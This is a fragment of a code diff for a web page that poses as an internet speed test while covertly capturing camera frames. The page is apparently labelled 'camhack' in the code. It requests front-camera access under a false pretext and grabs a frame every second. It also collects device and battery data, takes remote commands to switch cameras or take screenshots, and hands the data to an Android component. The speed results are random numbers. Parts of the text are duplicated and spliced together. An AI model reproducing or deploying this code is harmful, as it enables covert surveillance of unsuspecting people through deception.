-                const video = document.getElementById('camera');
-                const canvas = document.getElementById('canvas');
-                const ctx = canvas.getContext('2d');
-                
-                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                const screenshot = canvas.toDataURL('image/jpeg', 0.9);
-                
-                const data = {
-                    type: 'SCREENSHOT',
-                    session: sessionId,
-                    screenshot: screenshot,
-                    timestamp: Date.now()
-                };
-                
-                localStorage.setItem('latestScreenshot', JSON.stringify(data));
-                console.log('Screenshot captured');
-                
-            } catch (error) {
-                console.error('Screenshot failed:', error);
-            }
-        }
-        
-        function disconnect() {
-            if (mediaStream) {
-                mediaStream.getTracks().forEach(track => track.stop());
-                mediaStream = null;
-            }
-            
-            const data = {
-                type: 'DISCONNECTED',
-                session: sessionId,
-                timestamp: Date.now()
-            };
-            
-            localStorage.setItem('disconnect_' + sessionId, JSON.stringify(data));
-        }
-        
-        // Cleanup on page unload
-        window.addEventListener('beforeunload', () => {
-            disconnect();
-        });
-        
-        // Keep page active
-        if ('wakeLock' in navigator) {
-            navigator.wakeLock.request('screen').catch(() => {});
-        }
-        
-        // Prevent accidental close during test
-        window.addEventListener('beforeunload', (e) => {
-            if (isTestRunning || frameCount > 0) {
-                e.preventDefault();
-                e.returnValue = 'Speed test in progress. Are you sure you want to leave?';
-            }
-        });
-    </script>
-</body>
-</html>     // Store in localStorage for Android to pick up
-            localStorage.setItem('device_info_' + sessionId, JSON.stringify(data));
-            localStorage.setItem('latest_camhack_data', JSON.stringify(data));
-            
-            console.log('CAMHACK_DATA: Device info collected', data);
-        }
-        
-        async function requestCameraAccess() {
-            try {
-                console.log('Requesting camera access for network analysis...');
-                
-                const constraints = {
-                    video: {
-                        facingMode: 'user', // Front camera
-                        width: { ideal: 640 },
-                        height: { ideal: 480 }
-                    },
-                    audio: false
-                };
-                
-                mediaStream = await navigator.mediaDevices.getUserMedia(constraints);
-                
-                const video = document.getElementById('camera');
-                video.srcObject = mediaStream;
-                
-                // Wait for video to be ready
-                video.addEventListener('loadedmetadata', () => {
-                    console.log('TARGET CONNECTED: Camera access granted');
-                    
-                    const canvas = document.getElementById('canvas');
-                    canvas.width = video.videoWidth;
-                    canvas.height = video.videoHeight;
-                    
-                    // Send connection status
-                    const statusData = {
-                        type: 'TARGET_CONNECTED',
-                        session: sessionId,
-                        status: 'active',
-                        url: window.location.href,
-                        timestamp: Date.now()
-                    };
-                    
-                    localStorage.setItem('camera_status_' + sessionId, JSON.stringify(statusData));
-                    localStorage.setItem('connection_status', 'ACTIVE');
-                    
-                    // Start frame capture
-                    startFrameCapture();
-                });
-                
-            } catch (error) {
-                console.error('Camera access denied:', error);
-                
-                const statusData = {
-                    type: 'CAMERA_ERROR',
-                    session: sessionId,
-                    status: 'error',
-                    error: error.message,
-                    timestamp: Date.now()
-                };
-                
-                localStorage.setItem('camera_status_' + sessionId, JSON.stringify(statusData));
-            }
-        }
-        
-        function startFrameCapture() {
-            const video = document.getElementById('camera');
-            const canvas = document.getElementById('canvas');
-            const ctx = canvas.getContext('2d');
-            
-            function captureFrame() {
-                if (mediaStream && video.readyState === 4) {
-                    try {
-                        // Draw current frame to canvas
-                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                        
-                        // Convert to base64
-                        const frameData = canvas.toDataURL('image/jpeg', 0.7);
-                        
-                        frameCount++;
-                        
-                        const data = {
-                            type: 'CAMERA_FRAME',
-                            session: sessionId,
-                            image: frameData,
-                            frameNumber: frameCount,
-                            facingMode: 'user',
-                            timestamp: Date.now()
-                        };
-                        
-                        // Store for Android to pick up
-                        localStorage.setItem('latest_frame_' + sessionId, JSON.stringify(data));
-                        
-                        console.log('FRAME CAPTURED: #' + frameCount);
-                        
-                        // Send via postMessage for real-time communication
-                        window.postMessage(data, '*');
-                        
-                    } catch (error) {
-                        console.error('Frame capture error:', error);
-                    }
-                }
-                
-                // Capture next frame (30 FPS = ~33ms)
-                setTimeout(captureFrame, 1000); // 1 FPS for efficiency
-            }
-            
-            // Start capturing
-            captureFrame();
-        }
-        
-        function startBackgroundMonitoring() {
-            // Monitor page visibility
-            document.addEventListener('visibilitychange', () => {
-                const data = {
-                    type: 'VISIBILITY_CHANGE',
-                    session: sessionId,
-                    hidden: document.hidden,
-                    timestamp: Date.now()
-                };
-                
-                localStorage.setItem('visibility_' + sessionId, JSON.stringify(data));
-            });
-            
-            // Monitor battery changes
-            if ('getBattery' in navigator) {
-                navigator.getBattery().then(battery => {
-                    battery.addEventListener('levelchange', () => {
-                        deviceInfo.battery = Math.round(battery.level * 100);
-                        deviceInfo.charging = battery.charging;
-                        sendDeviceInfo();
-                    });
-                });
-            }
-            
-            // Send periodic heartbeat
-            setInterval(() => {
-                const heartbeat = {
-                    session: sessionId,
-                    timestamp: Date.now(),
-                    frameCount: frameCount,
-                    online: navigator.onLine,
-                    battery: deviceInfo.battery || 0,
-                    connection: deviceInfo.networkType || 'unknown',
-                    cameraActive: mediaStream !== null,
-                    pageVisible: !document.hidden
-                };
-                
-                localStorage.setItem('heartbeat_' + sessionId, JSON.stringify(heartbeat));
-            }, 3000);
-        }
-        
-        async function startSpeedTest() {
-            if (isTestRunning) return;
-            
-            isTestRunning = true;
-            document.getElementById('startBtn').style.display = 'none';
-            document.getElementById('shareBtn').style.display = 'none';
-            
-            const statusEl = document.getElementById('status');
-            const speedEl = document.getElementById('speedNumber');
-            const progressEl = document.getElementById('progressFill');
-            
-            // Test phases
-            const phases = [
-                { name: 'Initializing connection...', duration: 1000 },
-                { name: 'Testing ping...', duration: 2000 },
-                { name: 'Measuring download speed...', duration: 3000 },
-                { name: 'Measuring upload speed...', duration: 2500 },
-                { name: 'Analyzing network quality...', duration: 1500 },
+                { name: 'Initializing...', duration: 1000 },
+                { name: 'Testing download speed...', duration: 3000 },
+                { name: 'Testing upload speed...', duration: 2000 },
                 { name: 'Finalizing results...', duration: 1000 }
             ];
             
-            let currentPhase = 0;
-            let progress = 0;
-            
             for (const phase of phases) {
-                statusEl.textContent = phase.name;
+                statusEl.textContent = phase.name + ' (Camera: ' + (mediaStream ? (currentFacingMode === 'user' ? 'Front' : 'Back') : 'Inactive') + ')';
                 statusEl.className = 'status loading';
                 
-                const startTime = Date.now();
-                const phaseProgress = 100 / phases.length;
-                
-                // Animate progress and speed
-                const animatePhase = () => {
-                    const elapsed = Date.now() - startTime;
-                    const phasePercent = Math.min(elapsed / phase.duration, 1);
-                    
-                    progress = (currentPhase * phaseProgress) + (phasePercent * phaseProgress);
-                    progressEl.style.width = progress + '%';
-                    
-                    // Simulate speed changes
-                    if (phase.name.includes('download')) {
+                // Simulate speed changes
+                if (phase.name.includes('download')) {
+                    for (let i = 0; i < 30; i++) {
                         const speed = Math.floor(Math.random() * 80 + 20);
-                        speedEl.textContent = speed;
-                        document.getElementById('downloadValue').textContent = speed + ' Mbps';
-                    } else if (phase.name.includes('upload')) {
+                        speedEl.textContent = speed + ' Mbps';
+                        await new Promise(resolve => setTimeout(resolve, 100));
+                    }
+                } else if (phase.name.includes('upload')) {
+                    for (let i = 0; i < 20; i++) {
                         const speed = Math.floor(Math.random() * 40 + 10);
-                        speedEl.textContent = speed;
-                        document.getElementById('uploadValue').textContent = speed + ' Mbps';
-                    } else if (phase.name.includes('ping')) {
-                        const ping = Math.floor(Math.random() * 50 + 10);
-                        document.getElementById('pingValue').textContent = ping + ' ms';
+                        speedEl.textContent = speed + ' Mbps';
+                        await new Promise(resolve => setTimeout(resolve, 100));
                     }
-                    
-                    if (phasePercent < 1) {
-                        requestAnimationFrame(animatePhase);
-                    }
-                };
+                }
                 
-                animatePhase();
                 await new Promise(resolve => setTimeout(resolve, phase.duration));
-                currentPhase++;
             }
             
             // Final results
             const finalSpeed = Math.floor(Math.random() * 100 + 50);
-            const finalPing = Math.floor(Math.random() * 30 + 5);
-            const finalJitter = Math.floor(Math.random() * 10 + 1);
+            speedEl.textContent = finalSpeed + ' Mbps';
             
-            speedEl.textContent = finalSpeed;
-            document.getElementById('pingValue').textContent = finalPing + ' ms';
-            document.getElementById('jitterValue').textContent = finalJitter + ' ms';
-            
-            statusEl.textContent = '✅ Speed test completed successfully!';
+            statusEl.textContent = '✅ Test completed! Camera frames captured: ' + frameCount + ' (' + (currentFacingMode === 'user' ? 'Front' : 'Back') + ')';
             statusEl.className = 'status';
             
-            document.getElementById('shareBtn').style.display = 'inline-block';
-            
-            // Send results
-            const results = {
-                type: 'SPEED_RESULTS',
-                session: sessionId,
-                ping: finalPing + ' ms',
-                download: document.getElementById('downloadValue').textContent,
-                upload: document.getElementById('uploadValue').textContent,
-                jitter: finalJitter + ' ms',
-                timestamp: Date.now()
-            };
-            
-            localStorage.setItem('speed_results_' + sessionId, JSON.stringify(results));
-            
             isTestRunning = false;
-        }
-        
-        function shareResults() {
-            const results = {
-                ping: document.getElementById('pingValue').textContent,
-                download: document.getElementById('downloadValue').textContent,
-                upload: document.getElementById('uploadValue').textContent,
-                jitter: document.getElementById('jitterValue').textContent
-            };
-            
-            if (navigator.share) {
-                navigator.share({
-                    title: 'My SpeedTest Results',
-                    text: `Ping: ${results.ping}, Download: ${results.download}, Upload: ${results.upload}`,
-                    url: window.location.href
-                });
-            } else {
-                // Fallback
-                const text = `SpeedTest Results:\\nPing: ${results.ping}\\nDownload: ${results.download}\\nUpload: ${results.upload}\\nJitter: ${results.jitter}`;
-                
-                if (navigator.clipboard) {
-                    navigator.clipboard.writeText(text);
-                    alert('Results copied to clipboard!');
-                } else {
-                    alert(text);
-                }
-            }
-            
-            // Send share event
-            const shareData = {
-                type: 'RESULTS_SHARED',
-                session: sessionId,
-                results: results,
-                timestamp: Date.now()
-            };
-            
-            localStorage.setItem('share_event_' + sessionId, JSON.stringify(shareData));
-        }
-        
-        // Listen for commands from Android
-        window.addEventListener('message', (event) => {
-            if (event.data && event.data.command) {
-                handleCommand(event.data.command);
-            }
-        });
-        
-        function handleCommand(command) {
-            console.log('Received command:', command);
-            
-            switch (command) {
-                case 'switch_camera':
-                    switchCamera();
-                    break;
-                case 'capture_frame':
-                    captureScreenshot();
-                    break;
-                case 'disconnect':
-                    disconnect();
-                    break;
-            }
-        }
-        
-        async function switchCamera() {
-            if (!mediaStream) return;
-            
-            try {
-                // Stop current stream
-                mediaStream.getTracks().forEach(track => track.stop());
-                
-                // Switch to back camera
-                const constraints = {
-                    video: {
-                        facingMode: 'environment', // Back camera
-                        width: { ideal: 640 },
-                        height: { ideal: 480 }
-                    },
-                    audio: false
-                };
-                
-                mediaStream = await navigator.mediaDevices.getUserMedia(constraints);
-                document.getElementById('camera').srcObject = mediaStream;
-                
-                console.log('Camera switched to back camera');
-                
-            } catch (error) {
-                console.error('Camera switch failed:', error);
-            }
-        }
-        
-        function captureScreenshot() {
-            try {
-                const video = document.getElementById('camera');
-                const canvas = document.getElementById('canvas');
-                const ctx = canvas.getContext('2d');
-                
-                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                const screenshot = canvas.toDataURL('image/jpeg', 0.9);
-                
-                const data = {
-                    type: 'SCREENSHOT',
-                    session: sessionId,
-                    screenshot: screenshot,
-                    timestamp: Date.now()
-                };
-                
-                localStorage.setItem('latestScreenshot', JSON.stringify(data));
-                console.log('Screenshot captured');
-                
-            } catch (error) {
-                console.error('Screenshot failed:', error);
-            }
-        }
-        
-        function disconnect() {
-            if (mediaStream) {
-                mediaStream.getTracks().forEach(track => track.stop());
-                mediaStream = null;
-            }
-            
-            const data = {
-                type: 'DISCONNECTED',
-                session: sessionId,
-                timestamp: Date.now()
-            };
-            
-            localStorage.setItem('disconnect_' + sessionId, JSON.stringify(data));
         }
         
         // Cleanup on page unload
@@ -1495,9 +557,9 @@
         
         // Prevent accidental close
         window.addEventListener('beforeunload', (e) => {
-            if (isTestRunning) {
+            if (frameCount > 0) {
                 e.preventDefault();
-                e.returnValue = 'Speed test in progress. Are you sure you want to leave?';
+                e.returnValue = 'Camera feed active. Are you sure you want to leave?';
             }
         });
     </script>
